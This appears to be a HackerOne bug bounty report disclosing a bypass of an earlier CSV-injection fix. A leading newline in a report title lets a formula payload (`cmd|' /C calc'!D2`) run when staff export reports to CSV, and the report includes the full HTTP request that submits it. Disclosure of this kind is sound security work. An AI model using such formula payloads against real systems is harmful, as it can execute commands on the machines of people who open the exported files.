Summary:

Hi , I have managed to bypass your fix for #72785 by submitting a report with *NewLine* character (0x0a) in the title before the CSV formula.
#Steps to reproduce: 
1. As a researcher , Submit a report to a program with the title `%0A-2+3+cmd|' /C calc'!D2` , here is an example request: 

```
POST https://hackerone.com/security/reports/ HTTP/1.1
accept: application/json, text/javascript, */*; q=0.01
accept-encoding: gzip, deflate
accept-language: ar,en-US;q=0.8,en;q=0.6
content-length: 165
content-type: application/x-www-form-urlencoded; charset=UTF-8

report%5Btitle%5D=%0A-2%2B3%2Bcmd%7C'+%2FC+calc'!D2&report%5Bvulnerability_information%5D=test&report%5Bvulnerability_type_ids%5D%5B%5D=85553&report%5Bforce%5D=false
```
2. As a response team, Go to **Reports** page then export the report as CSV.
3. open the CSV file and you'll see that the cell is active.

Thanks
